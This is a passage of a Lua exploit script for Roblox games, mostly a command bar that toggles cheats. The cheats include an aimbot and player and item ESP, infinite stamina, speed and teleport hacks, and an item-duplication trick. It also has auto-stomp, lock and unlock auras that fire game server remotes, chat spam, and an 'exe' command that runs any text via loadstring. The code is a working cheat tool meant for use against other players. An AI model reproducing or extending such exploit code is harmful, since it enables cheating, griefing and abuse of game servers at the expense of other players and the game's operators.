		OnDied()

		--//Tpbypass
		if ONtpbypass then
			local r = root()
			if r then 
				r:Destroy()
			end
		end

		--//View
		if viewplayer then
			workspace.CurrentCamera.CameraSubject = viewplayer.Character
		end

		--//Shot Count
		coroutine.resume(coroutine.create(function()
			shotcount()
		end))

		--//Annoying Guis
		if ONguis then
			coroutine.resume(coroutine.create(function()
				plr.PlayerGui:WaitForChild"HUD".ImageButton.Visible = false
				plr.PlayerGui:WaitForChild"HUD".Mute.Visible = false
				if plr.PlayerGui:WaitForChild"HUD":FindFirstChild"Shop" then
					plr.PlayerGui.HUD.Shop.Visible = not ONguis
				end
				if plr.PlayerGui:WaitForChild"HUD":FindFirstChild"Groups" then
					plr.PlayerGui.HUD.Groups.Visible = not ONguis
				end
			end))
		end

		--//Save Tools
		if ONsavetools and ONbypass then
			coroutine.resume(coroutine.create(function()
				if dupeamount == 0 then
					for i, c in pairs(plr:GetChildren()) do
						if c:IsA"Tool" then
							c.Parent = plr.Backpack
						end
					end
				elseif dupeamount > 0 then
					wait(1)
					plr.Character:BreakJoints()
					dupeamount = dupeamount - 1
				end
			end))
		end

		--//Infinite Stamina
		if plr.Backpack:FindFirstChild"ServerTraits" then
			plr.Backpack.ServerTraits.Stann.Changed:Connect(function()
				plr.Backpack.ServerTraits.Stann.Value = 100
			end)
		else
			plr.Character:WaitForChild"Stamina".Changed:Connect(function()
				plr.Character.Stamina.Value = 100
			end)
		end

		--//JumpPower
		char:WaitForChild"Humanoid".JumpPower = jumppower

		--//Autoplay
		coroutine.resume(coroutine.create(function()
			if ONautoplay then
				plr.Backpack:WaitForChild("BoomBox", 10)
				PlayAudio(AutoID)
				repeat wait() until plr.Character.BoomBox.Handle.SoundX.PlaybackLoudness > 5
				-- repeat wait() until plr.Character.Torso:FindFirstChild"Song" ~= nil and plr.Character.Torso:FindFirstChild"Song".PlaybackLoudness >= 5
				ClearTools()
			end
		end))

		--//Visualizers
		if ONknifeaura then
			KnifeAura()
		end

		--//Mecha Robot
		if ONmecha then
			MechaBot()
		end

		--//Horse
		if ONhorse then
			Horse()
		end

		--//Gun Animations
		char.ChildAdded:Connect(function(c)
			GunAnimations(c)
		end)

		plr.Backpack.ChildAdded:Connect(function(c)
			BackpackStuff(c)
		end)

		--//Rainbow Bullets
		if ONrainbowbullets then
			rainbowbullets(char:WaitForChild"Humanoid")
		end
		
		--//Rainbow Trails
		if ONrainbowtrails then
			rainbowtrails(char:WaitForChild"Humanoid")
		end

		--//ay
		coroutine.resume(coroutine.create(function()
			if ONay then
				wait(0.5)
				if plr.Backpack:FindFirstChild"BoomBox" then
					plr.Backpack:FindFirstChild"BoomBox".Parent = plr.Character
				end
				local radio = char:FindFirstChild"BoomBox"
				radio.Remote:FireServer("PlaySong", tonumber(2739656426))
				wait(0.5)
				radio.Server:Destroy()
				radio.Client:Destroy()
				radio.Parent = plr.Backpack
			end
		end))

		--//Bar Hide
		repeat wait() until plr.PlayerGui:FindFirstChild"HUD" ~= nil
		bars = {}
		BarHide()

		--//No Stop
		--NoStop(char)

		--//Inventory Sorting
		if ONsorting and dupeamount < 1 then
			for i = 1, #st do
				if st[i][2] ~= nil then
					if mps:PlayerOwnsAsset(plr, st[i][2]) then
						repeat wait() until plr.Backpack:FindFirstChild(st[i][1])
					end
				else
					repeat wait() until plr.Backpack:FindFirstChild(st[i][1])
				end
			end
			Sort()
		end

		--//Auto Reset
		if ONautoreset then
			AutoReset()
		end

		--//Night Vision
		if state then
			CreateNV(false)
		end

		--//Walk while knocked
		if ONwalk and not ONlegit then
			walk()
		end

		--//Anti Knock
		antiKnock()
	end)
end

--//Command Bar Stuff
uis.InputBegan:Connect(function(i, chatting)
	if chatting then return end
	if i.KeyCode == Enum.KeyCode[Keys["pawelCmdbar"]] then
		wait()
		TextBox2:CaptureFocus()
		Frame.Visible = true
	end
end)

--//Commands
TextBox2.FocusLost:Connect(function()
	Frame.Visible = false
	local RADIOTYPE = Radiotype(false)
	local args = {}

	for arg in TextBox2.Text:gmatch("%S+") do
		args[#args + 1] = arg
	end

	--//Text Check
	local success, err = pcall(function()
		if args[1] ~= nil then
			args[1] = args[1]:lower()

			--//Audio Library
			if _G.SONGLIST ~= nil then
				for i, c in next, _G.SONGLIST do
					if args[1] == prefix.. c[1]:lower() then
						PlayAudio(c[2])
					end
				end
			end

			if args[1] == "dance" then
				local Anim = Instance.new"Animation"
				Anim.AnimationId = "rbxassetid://35654637"
				plr.Character.Humanoid:LoadAnimation(Anim):Play()
			elseif args[1] == "undance" then
				for i, c in pairs(plr.Character.Humanoid:GetPlayingAnimationTracks()) do
					if c.Animation.AnimationId == "rbxassetid://35654637" or c.Animation.AnimationId == "rbxassetid://33796059" then
						c:Stop()
					end
				end
			elseif args[1] == "dance2" then
				local Anim = Instance.new"Animation"
				Anim.AnimationId = "rbxassetid://33796059"
				plr.Character.Humanoid:LoadAnimation(Anim):Play()
			elseif args[1] == "spin" then
				local Anim = Instance.new"Animation"
				Anim.AnimationId = "rbxassetid://188632011"
				local track = plr.Character.Humanoid:LoadAnimation(Anim)
				local SpinACTIVE = false
				ONspin = true
				SpinACTIVE = not SpinACTIVE
				if SpinACTIVE then
					coroutine.resume(coroutine.create(function()
						while wait() do
							if ONspin then
								if not track.IsPlaying then
									if SpinACTIVE then
										track:Play(.1, 1, 2)
									end
								end
							else
								track:Stop()
							end
						end
					end))
				end
			elseif args[1] == "unspin" then
				ONspin = false
				for i, c in pairs(plr.Character.Humanoid:GetPlayingAnimationTracks()) do
					if c.Animation.AnimationId == "rbxassetid://188632011" then
						c:Stop()
					end
				end
			elseif args[1] == "clip" then
				local Clipboard = setclipboard or toclipboard or clipboard
				local text = tostring(TextLabel.Text):match("%d+")
				if text ~= nil then
					Clipboard(text)
					Notify("Notification", "Set ".. text.. " to clipboard", 5)
				else
					Notify("Notification", "Nothing to copy!", 5)
				end
			elseif args[1] == "mesh" then
				if plr.Character:FindFirstChild"BoomBox" ~= nil then
					plr.Character.BoomBox.Handle.Mesh:Destroy()
				end
			elseif (args[1] == "s" or args[1] == "ls") and args[2] ~= nil then
				ONaim = false
				local p = getPlayer(args[2]:lower())
				if p then
					aimtarget = p
					if args[1] == "s" then
						loop = false
						Notify("Notification", "Turned on aimbot. Current target is ".. p.Name, 5)
					else
						loop = true
						Notify("Notification", "Turned on loop aimbot. Current target is ".. p.Name, 5)
					end
					if not ONshoot then
						Shoot()
					end
				end
			elseif args[1] == "uns" then
				ONshoot = false
				aimtarget = nil
				Notify("Notification", "Turned off aimbot", 5)
			elseif args[1] == "items" then
				ONitemesp = not ONitemesp
				if ONitemesp then
					Notify("Notification", "Turned on item esp", 5)
				else
					Notify("Notification", "Turned off item esp", 5)
				end
				if ONitemesp then
					coroutine.resume(coroutine.create(function()
						repeat
							for i, c in pairs(workspace:GetChildren()) do
								if c.Name == "RandomSpawner" then
									for j, d in pairs(c.Model:GetDescendants()) do
										if not d.Parent.Parent:FindFirstChild"ItemEspBbg" and not d.Parent:FindFirstChild"ItemEspBbg" then
											--//Melees
											if d.Name == "Handle" and d.Size == Vector3.new(0.581927598, 4.82999611, 0.581927478) then
												CreateEsp(d.Parent, "Bat")
											elseif d.Name == "Handle" and d.BrickColor == BrickColor.new"Dusty Rose" then
												CreateEsp(d.Parent, "Crowbar")
											elseif d.Name == "Sign" then
												CreateEsp(d.Parent.Parent, "Stop Sign")
											elseif d.Name == "Handle" and d:IsA"MeshPart" and d.MeshId:match("%d+") == "441573384" then
												CreateEsp(d.Parent, "Golf Club")
											elseif d.Name == "Handle" and d:IsA"MeshPart" and d.MeshId:match("%d+") == "441575918" then
												CreateEsp(d.Parent, "Machete")
											elseif d.Name == "Blade" then
												CreateEsp(d.Parent.Parent, "Katana")
											elseif d:IsA"SpecialMesh" and d.MeshId:match("%d+") == "29690481" then
												CreateEsp(d.Parent.Parent, "Bottle")
											elseif d.Name == "Throw" then
												CreateEsp(d.Parent.Parent, "Brick")

												--//Guns
											elseif d.Name == "Eject" then
												CreateEsp(d.Parent.Parent, "Uzi")
											elseif d.Name == "Handle" and d:FindFirstChild"Fire" and d.CanCollide then
												CreateEsp(d.Parent, "Sawed Off")
											elseif d.Name == "Handle" and d:FindFirstChild"Fire" and not d:FindFirstChild"Eject" and not d.CanCollide then
												CreateEsp(d.Parent, "Shotty")

												--//Cash
											elseif d.Name == "Handle" and d:IsA"MeshPart" and d.MeshId:match("%d+") == "511726060" then
												if d.Size == Vector3.new(1.83385563, 0.205843687, 0.7981987) then
													CreateEsp(d.Parent, "Cash")
												else
													CreateEsp(d.Parent, "Fat Cash")
												end
											end
										end
									end
								end
							end
							wait(5)
						until not ONitemesp
					end))
				else
					ONitemesp = false
					for i, d in pairs(workspace:GetDescendants()) do
						if d:IsA"BillboardGui" and d.Name == "ItemEspBbg" then
							d:Destroy()
						end
					end
				end
			elseif args[1] == "pl" and args[2] ~= nil then
				local ID = args[2]
				if ID ~= "" then
					PlayAudio(ID)
				end
			elseif args[1] == "st" then
				for i, c in pairs(GetTools("BoomBox")) do
					if c:FindFirstChildOfClass"RemoteEvent" then
						c.RemoteEvent:FireServer"stop"
					end
				end
			elseif args[1] == "autoplay" then
				ONautoplay = not ONautoplay
				if ONautoplay then
					Notify("Notification", "Turned on autoplay", 5)
				else
					Notify("Notification", "Turned off autoplay", 5)
				end
			elseif args[1] == "respawn" then
				ONrespawn = not ONrespawn
				if ONrespawn then
					Notify("Notification", "Turned on respawn", 5)
				else
					Notify("Notification", "Turned off respawn", 5)
				end
			elseif args[1] == "view" and args[2] ~= nil then
				local p = getPlayer(args[2]:lower())
				if p then
					viewplayer = p
					if viewcon then
						viewcon:Disconnect()
					end
					viewcon = p.CharacterAdded:Connect(function(char)
						workspace.CurrentCamera.CameraSubject = char
					end)
					workspace.CurrentCamera.CameraSubject = p.Character
					Notify("Notification", "Viewing ".. p.Name, 5)
				end
			elseif args[1] == "unview" then
				if viewcon then
					viewcon:Disconnect()
				end
				viewplayer = nil
				workspace.CurrentCamera.CameraSubject = plr.Character
			elseif args[1] == "sens" and args[2] ~= nil then
				local sensitivity = args[2]:match"%d+"
				if sensitivity ~= "" then
					sens = sensitivity
					Notify("Notification", "Sensitivity has been set to ".. sens, 5)
				end
			elseif args[1] == "sit" then
				plr.Character.Humanoid.Sit = true
			elseif args[1] == "gunanims" then
				ONgunanims = not ONgunanims
				if ONgunanims then
					Notify("Notification", "Turned on gun animations", 5)
				else
					Notify("Notification", "Turned off gun animations", 5)
				end
			elseif args[1] == "ws" and args[2] ~= nil then
				local speedvalue = args[2]:match("%d+")
				if speedvalue ~= "" then
					speed = speedvalue
					Notify("Notification", "Speed has been set to ".. speed, 5)
				end
			elseif args[1] == "speed" then
				ONspeed = not ONspeed
				if ONspeed then
					ONblink = false
					Notify("Notification", "Turned on speed", 5)
				else
					Notify("Notification", "Turned off speed", 5)
				end
			elseif args[1] == "infjump" then
				ONinfinitejump = not ONinfinitejump
				if ONinfinitejump then
					Notify("Notification", "Turned on infinite jump", 5)
				else
					Notify("Notification", "Turned off infinite jump", 5)
				end
			elseif args[1] == "unlock" then
				ONlockall = false
				ONunlockall = not ONunlockall
				coroutine.resume(coroutine.create(function()
					while ONunlockall do
						for i = 1, #Doors do
							if Doors[i]:FindFirstChild"Lock" ~= nil and Doors[i].Locker.Value and (Doors[i].Lock.Position - root().Position).magnitude < 5 then
								Doors[i].Lock.ClickDetector.RemoteEvent:FireServer()
							end
						end
						wait(0.1)
					end
				end))
				if ONunlockall then
					Notify("Notification", "Turned on unlock aura", 5)
				else
					Notify("Notification", "Turned off unlock aura", 5)
				end
			elseif args[1] == "lock" then
				ONunlockall = false
				ONlockall = not ONlockall
				coroutine.resume(coroutine.create(function()
					while ONlockall do
						for i = 1, #Doors do
							if Doors[i]:FindFirstChild"Lock" ~= nil and not Doors[i].Locker.Value and (Doors[i].Lock.Position - root().Position).magnitude < 5 then
								Doors[i].Lock.ClickDetector.RemoteEvent:FireServer()
							end
						end
						wait(0.1)
					end
				end))
				if ONlockall then
					Notify("Notification", "Turned on lock aura", 5)
				else
					Notify("Notification", "Turned off lock aura", 5)
				end
			elseif args[1] == "killph" then
				ONkillphrase = not ONkillphrase
				if ONkillphrase then
					Notify("Notification", "Turned on kill phrase", 5)
				else
					Notify("Notification", "Turned off kill phrase", 5)
				end
			elseif args[1] == "phrase" and args[2] ~= nil then
				local phrase = ""
				for i = 2, #args, 1 do
					local new = args[i]
					phrase = tostring(phrase.." "..new)
				end
				if phrase ~= "" then
					killphrase = phrase
					Notify("Notification", "Speech has been set to ".. killphrase, 5)
				end
			elseif args[1] == "ay" then
				ONay = not ONay
				if ONay then
					ClearTools()
					local b = plr.Backpack:FindFirstChild"BoomBox"

					if b then
						b.GripPos = Vector3.new(-6, -1.25, 0)
						PlayAudio(2739656426)
						repeat wait() until b.Handle.SoundX.PlaybackLoudness > 5
						b.Parent = plr.Backpack

						coroutine.resume(coroutine.create(function()
							while ONay do
								rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ayayayayayayayayayayay", "All")
								wait(2)
							end
						end))
					else
						Notify("Error", "Couldn't find boombox!", 5)
					end
				elseif plr.Character:FindFirstChild"BoomBox" then
					ClearTools()
				end
				if ONay then
					Notify("Notification", "Turned on ay", 5)
				else
					Notify("Notification", "Turned off ay", 5)
				end
			elseif args[1] == "savetools" then
				ONsavetools = not ONsavetools
				if ONsavetools then
					Notify("Notification", "Turned on tool saving", 5)
				else
					Notify("Notification", "Turned off tool saving", 5)
				end
			elseif args[1] == "bfg" then
				ONbfg = not ONbfg
				local temp = ONbfg
				toggleBFG()
				ONbfg = temp
				for i, c in pairs(plr.Character:GetChildren()) do
					if CheckGuns(c) then
						c.Parent = plr.Backpack
					end
				end
				if ONbfg then
					Notify("Notification", "Turned on BFG", 5)
				else
					Notify("Notification", "Turned off BFG", 5)
				end
			elseif args[1] == "suicidegun" then
				ONsuicidegun = not ONsuicidegun
				local temp = ONsuicidegun
				toggleBFG()
				ONsuicidegun = temp
				for i, c in pairs(plr.Character:GetChildren()) do
					if CheckGuns(c) then
						c.Parent = plr.Backpack
					end
				end
				if ONsuicidegun then
					Notify("Notification", "Turned on suicide gun", 5)
				else
					Notify("Notification", "Turned off suicide gun", 5)
				end
			elseif args[1] == "note" and args[2] ~= nil then
				local text = ""
				for i = 2, #args, 1 do
					local new = args[i]
					text = tostring(text.." "..new)
				end
				if text ~= "" then
					note = text
					Notify("Notification", "Note has been set to ".. note, 5)
				end
			elseif args[1] == "airwalk" then
				ONairwalk = not ONairwalk
				ONplatform = false
				if ONairwalk then
					Notify("Notification", "Enabled the airwalk keybind", 5)
				else
					Notify("Notification", "Disabled the airwalk keybind", 5)
				end
			elseif args[1] == "dualbfg" then
				ONdualbfg = not ONdualbfg
				local temp = ONdualbfg
				toggleBFG()
				ONdualbfg = temp
				for i, c in pairs(plr.Character:GetChildren()) do
					if CheckGuns(c) then
						c.Parent = plr.Backpack
					end
				end
				if ONdualbfg then
					Notify("Notification", "Turned on dual glocks", 5)
				else
					Notify("Notification", "Turned off dual glocks", 5)
				end
			elseif args[1] == "deathnote" then
				ONdeathnote = not ONdeathnote
				if ONdeathnote then
					Notify("Notification", "Turned on death note", 5)
				else
					Notify("Notification", "Turned off death note", 5)
				end
			elseif args[1] == "claws" then
				ONclaws = not ONclaws
				ONknifeaura = false
				for i, c in pairs(plr.Character:GetChildren()) do
					if c.Name == "Knife" then
						c.Parent = plr.Backpack
					end
				end
				if ONclaws then
					Notify("Notification", "Turned on claws", 5)
				else
					Notify("Notification", "Turned off claws", 5)
				end
			elseif args[1] == "kaura" then
				ONknifeaura = not ONknifeaura
				local temp = ONknifeaura
				toggleBFG()
				ONknifeaura = temp
				if ONknifeaura then
					KnifeAura()
					Notify("Notification", "Turned on knife aura", 5)
				else
					Notify("Notification", "Turned off knife aura", 5)
				end
			elseif args[1] == "kauravis" then
				ONknifeauravisualizer = not ONknifeauravisualizer
				if ONknifeauravisualizer then
					Notify("Notification", "Turned on knife aura visualization", 5)
				else
					Notify("Notification", "Turned off knife aura visualization", 5)
				end
			elseif args[1] == "add" and args[2] ~= nil then
				local tool = args[2]:lower()
				if tool ~= "" then
					if checktoolname(tool) then
						table.insert(DupeList, tool)
						Notify("Notification", tool.. " has been added to the duplication list", 5)
					end
				end
			elseif args[1] == "remove" and args[2] ~= nil then
				local tool = args[2]:lower()
				if tool ~= "" then
					for i = 1, #DupeList do
						if DupeList[i]:lower() == tool then
							table.remove(DupeList, i)
							Notify("Notification", tool.. " has been removed from the duplication list", 5)
							break
						end
					end
				end
			elseif args[1] == "dupelist" then
				for i = 1, #DupeList do
					print(DupeList[i])
				end
				Notify("Notification", "Printed the duplication list", 5)
			elseif args[1] == "count" and args[2] ~= nil then
				local tool = args[2]:lower()
				if tool ~= "" then
					print(#GetTools(tool).. " ".. tool.. "s")
					Notify("Notification", #GetTools(tool).. " ".. tool.. "s", 5)
				end
			elseif args[1] == "turnspeed" then
				local speedvalue = args[2]:match"%d+"
				if speedvalue ~= "" then
					turnspeed = speedvalue
				end
			elseif args[1] == "offset" and args[2] ~= nil then
				local offsetvalue = args[2]:match"%d+"
				if offsetvalue ~= "" then
					offset = offsetvalue
					Notify("Notification", "Offset has been set to ".. offset, 5)
				end
			elseif args[1] == "mecha" and game.PlaceId == 4669040 then
				if #GetTools"BoomBox" >= 48 and #GetTools"Pipe" >= 7 and #GetTools"Glock" >= 2 then
					ONmecha = not ONmecha
					local temp = ONmecha
					toggleBFG()
					ONmecha = temp
					if ONmecha then
						MechaBot()
						Notify("Notification", "Turned on mecha robot", 5)
					else
						plr.Character.Humanoid.HipHeight = 0
						ClearTools()
						Notify("Notification", "Turned off mecha robot", 5)
					end
				else
					print"Not enough tools! The proper amount that is required is: 48 Boomboxes, 7 Pipes and 2 Glocks!"
					Notify("Notification", "Not enough tools. Check output for more details", 5)
				end
			elseif args[1] == "rejoin" then
				tp:TeleportToPlaceInstance(game.PlaceId, game.JobId)
				Notify("Notification", "Rejoining...", 5)	
			elseif args[1] == "!prison" then
				tp:Teleport(4669040, plr)
				Notify("Notification", "Teleporting...", 5)
			elseif args[1] == "!streets" then
				tp:Teleport(455366377, plr)
				Notify("Notification", "Teleporting...", 5)
			elseif args[1] == "turrets" then
				if #GetTools("Shotty") >= 32 then
					ONturrets = not ONturrets
					local temp = ONturrets
					toggleBFG()
					ONturrets = temp
					for i, c in pairs(plr.Character:GetChildren()) do
						if CheckGuns(c) then
							c.Parent = plr.Backpack
						end
					end
					if ONturrets then
						Notify("Notification", "Turned on turrets", 5)
					else
						Notify("Notification", "Turned off turrets", 5)
					end
				else
					print"Not enough tools! The proper amount that is required is: 32 Shottys!"
					Notify("Notification", "Not enough tools. Check output for more details", 5)
				end
			elseif args[1] == "to" and args[2] ~= nil then
				local p = getPlayer(args[2]:lower())
				if p then
					if p and p.Character and p.Character:FindFirstChild"Torso" then
						Teleport(p.Character.Torso.Position, true)
						Notify("Notification", "Teleported to ".. p.Name, 5)
					else
						Notify("Notification", "Failed to teleport!", 5)
					end
				end
			elseif args[1] == "horse" and game.PlaceId == 4669040 then
				if #GetTools("BoomBox") >= 8 and #GetTools("Glock") >= 4 and #GetTools("Shotty") >= 2 and #GetTools("Spray") >= 8 then
					ONhorse = not ONhorse
					local temp = ONhorse
					toggleBFG()
					ONhorse = temp
					if ONhorse then
						Horse()
						Notify("Notification", "Turned on horse", 5)
					else
						Notify("Notification", "Turned off horse", 5)
					end
				else
					print"Not enough tools! The proper amount that is required is: 8 Boomboxes, 4 Glocks, 2 Shottys and 8 Sprays!"
					Notify("Notification", "Not enough tools. Check output for more details", 5)
				end
			end
		end
	end)
end)

--//Commands
TextBox2.FocusLost:Connect(function()
	Frame.Visible = false
	local RADIOTYPE = Radiotype(false)
	local args = {}

	for arg in TextBox2.Text:gmatch("%S+") do
		args[#args + 1] = arg
	end

	--//Text Check
	local success, err = pcall(function()
		if args[1] ~= nil then
			args[1] = args[1]:lower()
			if args[1] == "dupe" and args[2] ~= nil then
				local amount = args[2]:match"%d+"
				if amount ~= "" then
					if ONbypass then
						dupeamount = amount - 1
						plr.Character:BreakJoints()
					else
						Notify("Notification", "Please turn on bypass", 5)
					end
				end
			elseif args[1] == "stop" then
				dupeamount = 0
			elseif args[1] == "re" then
				PlayAudio(AutoID)
			elseif args[1] == "halo" then
				if #GetTools("Glock") >= 2 and #GetTools("Shotty") >= 2 then
					ONhalo = not ONhalo
					local temp = ONhalo
					toggleBFG()
					ONhalo = temp
					if ONhalo then
						Notify("Notification", "Turned on energy sword bfg", 5)
					else
						Notify("Notification", "Turned off energy sword bfg", 5)
					end
				else
					print"Not enough tools! The proper amount that is required is: 2 Shottys and 2 Glocks!"
					Notify("Notification", "Not enough tools. Check output for more details", 5)
				end
			elseif args[1] == "bayonet" then
				if #GetTools("Shotty") >= 1 and #GetTools("Knife") >= 1 then
					ONbayonet = not ONbayonet
					local temp = ONbayonet
					toggleBFG()
					ONbayonet = temp
					if ONbayonet then
						Notify("Notification", "Turned on bayonet bfg", 5)
					else
						Notify("Notification", "Turned off bayonet bfg", 5)
					end
				else
					print"Not enough tools! The proper amount that is required is: 1 Shotty and 1 Knife!"
					Notify("Notification", "Not enough tools. Check output for more details", 5)
				end
			elseif args[1] == "bypass" then
				ONbypass = not ONbypass
				plr.Character:BreakJoints()
				if ONbypass then
					Notify("Notification", "Turned on semi-bfg bypass", 5)
				else
					Notify("Notification", "Turned off semi-bfg bypass", 5)
				end
			elseif args[1] == "exe" and args[2] ~= nil then
				local text = ""
				for i = 2, #args, 1 do
					local new = args[i]
					text = tostring(text.." "..new)
				end
				if text ~= "" then
					loadstring(text)()
				end
			elseif args[1] == "bar" then
				ONbarhide = not ONbarhide
				if ONbarhide then
					fade()
					Notify("Notification", "Turned on barhide", 5)
				else
					for i, c in pairs(plr.PlayerGui.HUD:GetDescendants()) do
						if c.Name == "Bar" then
							c.Transparency = 0
							c.Parent.Transparency = 0
						end
					end
					Notify("Notification", "Turned off barhide", 5)
				end
			elseif args[1] == "prefix" and args[2] ~= nil then
				if args[2] ~= "" then
					prefix = args[2]
				end
			elseif args[1] == "sort" then
				ONsorting = not ONsorting
				if ONsorting then
					Notify("Notification", "Turned on inventory sorting", 5)
					Sort()
				else
					Notify("Notification", "Turned off inventory sorting", 5)
					for i, c in pairs(plr.Backpack:GetChildren()) do
						if c:IsA"Tool" then
							c.Parent = plr
							c.Parent = plr.Backpack
						end
					end
				end
			elseif args[1] == "blink" then
				ONblink = not ONblink
				if ONblink then
					ONspeed = false
					Notify("Notification", "Turned on blink", 5)
				else
					Notify("Notification", "Turned off blink", 5)
				end
			elseif args[1] == "bs" and args[2] ~= nil then
				local bs = args[2]:match"%d+"
				if bs ~= "" then
					blinkspeed = tonumber(bs)
				end
				Notify("Notification", "Set blink speed to ".. args[2], 5)
			--[[elseif args[1] == "carseats" then
				if game.PlaceId == 455366377 then
					ONseats = not ONseats
					if ONseats then
						Notify("Notification", "Hid car seats", 5)
						for i = 1, #carseats do
							carseats[i][1].Parent = rep
						end
					else
						Notify("Notification", "Restored car seats", 5)
						for i = 1, #carseats do
							if carseats[i][1].Parent then
								carseats[i][1].Parent = carseats[i][2]
							end
						end
					end
				else
					Notify("Notification", "This only works on The Streets lol", 5)
				end]]
			elseif args[1] == "seats" then
				ONseats = not ONseats
				if ONseats then
					for i, d in pairs(gameDescendants) do
						if d:IsA"Seat" then
							d.Parent = rep
						end
					end
					Notify("Notification", "Turned off seats", 5)
				else
					for i, d in pairs(gameDescendants) do
						if d:IsA"Seat" then
							d.Parent = workspace
						end
					end
					Notify("Notification", "Turned on seats", 5)
				end
			elseif args[1] == "day" then
				Time = "14:00:00"
				toggleday(args[1])
				Notify("Notification", "Set time to day (".. Time.. ")", 5)
			elseif args[1] == "night" then
				Time = "02:00:00"
				toggleday(args[1])
				Notify("Notification", "Set time to night (".. Time.. ")", 5)
			elseif args[1] == "time" then
				if daycon ~= nil then
					daycon:Disconnect()
					daycon = nil
					Notify("Notification", "Restored normal day / night cycle", 5)
				end
			elseif args[1] == "autor" then
				ONautoreset = not ONautoreset
				if ONautoreset then
					Notify("Notification", "Turned on auto reset", 5)
				else
					Notify("Notification", "Turned off auto reset", 5)
				end
			elseif args[1] == "cmds" then
				toggleCmd()
			elseif args[1] == "esp" then
				if args[2] ~= nil then
					local p = getPlayer(args[2]:lower())
					if p then
						esp(p, "plr", "esp")
						Notify("Notification", "ESPd ".. p.Name, 5)
					end
				else
					Notify("Notification", "Turned on ESP", 5)
					for i, p in pairs(plrs:GetPlayers()) do
						if p ~= plr then
							esp(p, "all", "esp")
						end
					end
				end
			elseif args[1] == "unesp" then
				if args[2] ~= nil then
					local p = getPlayer(args[2]:lower())
					if p then
						unesp(p, "plr", "esp")
						Notify("Notification", "Un-ESPd ".. p.Name, 5)
					end
				else
					for i, p in pairs(plrs:GetPlayers()) do
						unesp(p, "all", "esp")
					end
					Notify("Notification", "Turned off ESP", 5)
				end
			elseif args[1] == "drop" and args[2] ~= nil then
				ClearTools()
				for i, c in pairs(plr.Backpack:GetChildren()) do
					if c:IsA"Tool" and c.Name:lower() == args[2]:lower() then
						for j, d in pairs(c:GetChildren()) do
							if d:IsA"Part" then
								d.CanCollide = true
							end
						end
						c.Parent = plr.Character
						c.Parent = plr.Character.Head
						c.Parent = workspace.Terrain
						break
					end
				end
				wait(0.1)
				plr.Character.Parent = workspace.Terrain
				plr.Character:Destroy()
			elseif args[1] == "nostop" then
				ONnostop = not ONnostop
				if ONnostop then
					Notify("Notification", "Turned on no stop", 5)
				else
					Notify("Notification", "Turned off no stop", 5)
				end
			elseif args[1] == "kos" then
				ONkosesp = not ONkosesp
				if ONkosesp then
					Notify("Notification", "Turned on kos esp", 5)
					for i, p in pairs(plrs:GetPlayers()) do
						espcheck(p)
					end
				else
					Notify("Notification", "Turned off kos esp", 5)
					for i, p in pairs(plrs:GetPlayers()) do
						unesp(p, "all", "kos")
					end
				end
			elseif args[1] == "buyer" then
				ONbuyeresp = not ONbuyeresp
				if ONbuyeresp then
					Notify("Notification", "Turned on buyer esp", 5)
					for i, p in pairs(plrs:GetPlayers()) do
						espcheck(p, "buyer")
					end
				else
					Notify("Notification", "Turned off buyer esp", 5)
					for i, p in pairs(plrs:GetPlayers()) do
						unesp(p, "all", "buyer")
					end
				end
			elseif args[1] == "autostomp" then
				ONautostomp = not ONautostomp
				if ONautostomp then
					Notify("Notification", "Turned on auto stomp", 5)
				else
					Notify("Notification", "Turned off auto stomp", 5)
				end
				repeat
					for i, p in pairs(plrs:GetPlayers()) do
						if p and p.Character and p.Character:FindFirstChild"Torso" and p.Character.Torso:FindFirstChild"Bone" and p ~= plr and (root().Position - p.Character.Torso.Position).magnitude <= stomprange then
							while p.Character.Humanoid.Health > 0 and ONautostomp do
								root().CFrame = CF(p.Character.Torso.Position)
								ClearTools()
								if not plr.Backpack:FindFirstChild"ServerTraits" then
									plr.Backpack.Punch.Parent = plr.Character
								end
								Stomp(plr.Backpack.Punch)
								wait()
							end
							ClearTools()
						end
					end
					wait()
				until not ONautostomp
			elseif args[1] == "sr" and args[2] ~= nil then
				local sr = args[2]:match"%d+"
				if sr ~= "" then
					stomprange = tonumber(sr)
					Notify("Notification", "Set stomp range to ".. sr, 5)
				end
			elseif args[1] == "stompspam" then
				ONstompspam = not ONstompspam
				if ONstompspam then
					Notify("Notification", "Turned on stomp spam", 5)
				else
					Notify("Notification", "Turned off stomp spam", 5)
				end
			elseif args[1] == "shield" and args[2] ~= nil then
				local p = getPlayer(args[2]:lower())
				if p then
					ONshield = true
					Notify("Notification", "Shielding ".. p.Name, 5)
					Teleport(p.Character.Torso.Position, true)
					while ONshield and p.Character and p.Character:FindFirstChild"Torso" and root() do
						root().CFrame = p.Character.Torso.CFrame * CF(0, 0, -1.5)
						heart:wait()
					end
				end
			elseif args[1] == "unshield" then
				ONshield = false
				Notify("Notification", "Ceased shielding", 5)
			elseif args[1] == "tper" then
				ONtper = not ONtper
				local tper = (workspace:FindFirstChild"Armoured Truck" and workspace["Armoured Truck"]:FindFirstChild"TPer") or workspace:FindFirstChild"TPer"
				if not tper then return end

				if ONtper then
					local tper2 = tper:Clone()
					tper2.BrickColor = BrickColor.new"Lime green"
					tper2.Parent = tper.Parent
					tper.Parent = rep
					Notify("Notification", "Turned off prison teleporter", 5)
				else
					rep:FindFirstChild"TPer".Parent = tper.Parent
					tper:Destroy()
					Notify("Notification", "Turned on prison teleporter", 5)
				end
			elseif args[1] == "snow" then
				ONsnow = not ONsnow
				if ONsnow then
					for i, c in pairs(workspace:GetChildren()) do
						if (c:IsA"Part" or c:IsA"UnionOperation") and (c.BrickColor == BrickColor.new"Pastel Blue" and c.Material == Enum.Material.Ice or c.Name == "snow" or c.Name == "Snowin") then
							c.Parent = rep
						end
					end
					Notify("Notification", "Turned off snow", 5)
				else
					for i, c in pairs(rep:GetChildren()) do
						if (c:IsA"Part" or c:IsA"UnionOperation") and (c.BrickColor == BrickColor.new"Pastel Blue" and c.Material == Enum.Material.Ice or c.Name == "snow" or c.Name == "Snowin") then
							c.Parent = workspace
						end
					end
					Notify("Notification", "Turned on snow", 5)
				end
			elseif args[1] == "legit" then
				ONlegit = not ONlegit
				if ONlegit then
					jumppower = 37.5
					plr.Character:WaitForChild"Humanoid".JumpPower = jumppower
					ONfly = false
					Notify("Notification", "Turned on legit mode", 5)
				else
					Notify("Notification", "Turned off legit mode", 5)
				end
			elseif args[1] == "walk" then
				ONwalk = not ONwalk
				if ONwalk then
					Notify("Notification", "Turned on walk while knocked", 5)
				else
					Notify("Notification", "Turned off walk while knocked", 5)
				end
